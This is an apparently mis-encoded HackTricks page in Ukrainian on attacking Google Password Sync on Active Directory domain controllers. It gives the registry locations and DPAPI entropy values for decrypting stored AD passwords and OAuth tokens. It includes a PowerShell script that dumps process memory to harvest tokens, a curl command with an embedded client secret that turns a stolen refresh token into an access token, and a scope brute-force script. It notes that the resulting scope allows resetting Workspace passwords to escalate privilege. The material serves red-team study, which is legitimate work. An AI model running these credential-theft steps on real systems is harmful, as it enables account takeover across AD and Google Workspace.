# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–¶–µ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —ñ —Å–ª—É–∂–±–∞, —è–∫—ñ Google –ø—Ä–æ–ø–æ–Ω—É—î –¥–ª—è **—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –ø–∞—Ä–æ–ª—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –º—ñ–∂ AD** —Ç–∞ Workspace. –ö–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–º—ñ–Ω—é—î —Å–≤—ñ–π –ø–∞—Ä–æ–ª—å –≤ AD, –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –≤ Google.

–í—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –≤ `C:\Program Files\Google\Password Sync`, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `PasswordSync.exe` –¥–ª—è –π–æ–≥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ `password_sync_service.exe` (—Å–ª—É–∂–±–∞, —è–∫–∞ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç—å –ø—Ä–∞—Ü—é–≤–∞—Ç–∏).

### GPS - –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è

–©–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ü–µ–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª (—ñ —Å–ª—É–∂–±—É), –ø–æ—Ç—Ä—ñ–±–Ω–æ **–Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å—É–ø–µ—Ä –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –≤ Workspace**:

* –£–≤—ñ–π—Ç–∏ —á–µ—Ä–µ–∑ **OAuth** –∑ Google, –ø—ñ—Å–ª—è —á–æ–≥–æ –≤—ñ–Ω **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ —Ç–æ–∫–µ–Ω —É —Ä–µ—î—Å—Ç—Ä—ñ (–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π)**
* –î–æ—Å—Ç—É–ø–Ω–æ –ª–∏—à–µ –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞—Ö –¥–æ–º–µ–Ω—É –∑ GUI
* –ù–∞–¥–∞—Ç–∏ –¥–µ—è–∫—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∑ GCP** (json —Ñ–∞–π–ª) –∑ –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ **–∫–µ—Ä—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ Workspace**
* –î—É–∂–µ –ø–æ–≥–∞–Ω–∞ —ñ–¥–µ—è, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–∫—ñ–Ω—á—É—é—Ç—å—Å—è —ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω—ñ
* –î—É–∂–µ –ø–æ–≥–∞–Ω–∞ —ñ–¥–µ—è –Ω–∞–¥–∞–≤–∞—Ç–∏ SA –¥–æ—Å—Ç—É–ø –¥–æ Workspace, –æ—Å–∫—ñ–ª—å–∫–∏ SA –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —É GCP, —ñ —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ Workspace
* Google –≤–∏–º–∞–≥–∞—î —Ü–µ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ–º–µ–Ω—É –±–µ–∑ GUI
* –¶—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ç–∞–∫–æ–∂ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Ä–µ—î—Å—Ç—Ä—ñ

–©–æ–¥–æ AD, –º–æ–∂–ª–∏–≤–æ –≤–∫–∞–∑–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π **–∫–æ–Ω—Ç–µ–∫—Å—Ç –¥–æ–¥–∞—Ç–∫—ñ–≤, –∞–Ω–æ–Ω—ñ–º–Ω–∏–π –∞–±–æ –¥–µ—è–∫—ñ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**. –Ø–∫—â–æ –≤–∏–±—Ä–∞–Ω–æ –æ–ø—Ü—ñ—é –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ —Ñ–∞–π–ª—ñ –Ω–∞ **–¥–∏—Å–∫—É**, –∞ **–ø–∞—Ä–æ–ª—å** —î **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º** —ñ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ **—Ä–µ—î—Å—Ç—Ä—ñ**.

### GPS - –í–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è —Ç–∞ —Ç–æ–∫–µ–Ω–∞ –∑ –¥–∏—Å–∫–∞

{% hint style="success" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) –∑–¥–∞—Ç–Ω–∏–π –≤–∏—è–≤–ª—è—Ç–∏ **GPS**, –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ **–Ω–∞–≤—ñ—Ç—å —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—å —ñ —Ç–æ–∫–µ–Ω**.
{% endhint %}

–£ —Ñ–∞–π–ª—ñ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —á–∞—Å—Ç–∏–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, —Ç–∞–∫—É —è–∫ **`baseDN`** –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ–≥–æ AD —Ç–∞ **`username`**, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —è–∫–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è.

–£ —Ä–µ—î—Å—Ç—Ä—ñ **`HKLM\Software\Google\Google Apps Password Sync`** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è** —Ç–∞ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å** –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD (—è–∫—â–æ —î). –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ –∑–∞–º—ñ—Å—Ç—å —Ç–æ–∫–µ–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–µ—è–∫—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ SA**, —ó—Ö —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º–∏ –∑–∞ —Ü—ñ—î—é –∞–¥—Ä–µ—Å–æ—é —Ä–µ—î—Å—Ç—Ä—É. **–ó–Ω–∞—á–µ–Ω–Ω—è** –≤ —Ü—å–æ–º—É —Ä–µ—î—Å—Ç—Ä—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –ª–∏—à–µ **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º**.

–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π **–ø–∞—Ä–æ–ª—å** (—è–∫—â–æ —î) –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–ª—é—á—ñ **`ADPassword`** —ñ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`CryptProtectData`** API. –©–æ–± —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ —Ç–∏–º –∂–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, —â–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–≤ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é –ø–∞—Ä–æ–ª—ñ–≤, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é **–µ–Ω—Ç—Ä–æ–ø—ñ—é** –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω (—è–∫—â–æ —î) –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–ª—é—á—ñ **`AuthToken`** —ñ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`CryptProtectData`** API. –©–æ–± —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ —Ç–∏–º –∂–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, —â–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–≤ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é –ø–∞—Ä–æ–ª—ñ–≤, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é **–µ–Ω—Ç—Ä–æ–ø—ñ—é** –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –≤—ñ–Ω —Ç–∞–∫–æ–∂ –∫–æ–¥—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é base32hex –∑ —Å–ª–æ–≤–Ω–∏–∫–æ–º **`0123456789abcdefghijklmnopqrstv`**.

–ó–Ω–∞—á–µ–Ω–Ω—è –µ–Ω—Ç—Ä–æ–ø—ñ—ó –±—É–ª–∏ –∑–Ω–∞–π–¥–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É. –í—ñ–Ω –±—É–≤ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –≤–∏–∫–ª–∏–∫—ñ–≤ –¥–æ **`CryptUnprotectData`** —Ç–∞ **`CryptProtectData`**, –∞ –ø–æ—Ç—ñ–º —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫—É —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É `PasswordSync.exe`, —è–∫–∏–π —Ä–æ–∑—à–∏—Ñ—Ä—É—î –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å —ñ —Ç–æ–∫–µ–Ω –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –Ω–∞ –ø–æ—á–∞—Ç–∫—É, —ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç **–ø–æ–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ—ó –µ–Ω—Ç—Ä–æ–ø—ñ—ó** –≤ –æ–±–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ** –∑–Ω–∞—á–µ–Ω–Ω—è –≤ –≤–≤–µ–¥–µ–Ω–Ω—ñ –∞–±–æ –≤–∏—Ö–æ–¥—ñ –≤–∏–∫–ª–∏–∫—ñ–≤ –¥–æ —Ü–∏—Ö API (–≤ —Ä–∞–∑—ñ, —è–∫—â–æ –≤ —è–∫–∏–π—Å—å –º–æ–º–µ–Ω—Ç Winpeas –ø–µ—Ä–µ—Å—Ç–∞–Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏).

–£ —Ä–∞–∑—ñ, —è–∫—â–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –ø–∞—Ä–æ–ª—ñ–≤ –±—É–ª–∞ **–Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ SA**, –≤–æ–Ω–∞ —Ç–∞–∫–æ–∂ –±—É–¥–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏—Å—è –≤ –∫–ª—é—á–∞—Ö —É —Ä–µ—î—Å—Ç—Ä—ñ **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - –í–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ GCPW, –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—É `PasswordSync.exe` —Ç–∞ `password_sync_service.exe`, —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ –≤–æ–Ω–∏ –≤–∂–µ –±—É–ª–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ).\
–Ø –¥—É–º–∞—é, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –± –∑–Ω–∞–π—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ AD.

<details>

<summary>–í–∏—Ç—è–≥–Ω—É—Ç–∏ <code>PasswordSync.exe</code> —Ç–∞ <code>password_sync_service.exe</code> –ø—Ä–æ—Ü–µ—Å–∏ —Ç–∞ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ refresh token, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∂–æ–¥–µ–Ω scope –¥–ª—è access token, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **scopes, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ access token**.

–¢–∞–∫–æ–∂ refresh token –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GPS –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ OAuth scope, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ scopes, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
https://www.googleapis.com/auth/admin.directory.user
```
–Ø–∫–∏–π —î —Ç–∏–º —Å–∞–º–∏–º, —â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ, —è–∫—â–æ –Ω–µ –≤–∫–∞–∑–∞—Ç–∏ –∂–æ–¥–Ω–æ—ó –æ–±–ª–∞—Å—Ç—ñ.

{% hint style="danger" %}
–ó —Ü—ñ—î—é –æ–±–ª–∞—Å—Ç—é –≤–∏ –º–æ–≥–ª–∏ –± **–∑–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å —ñ—Å–Ω—É—é—á–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**.
{% endhint %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
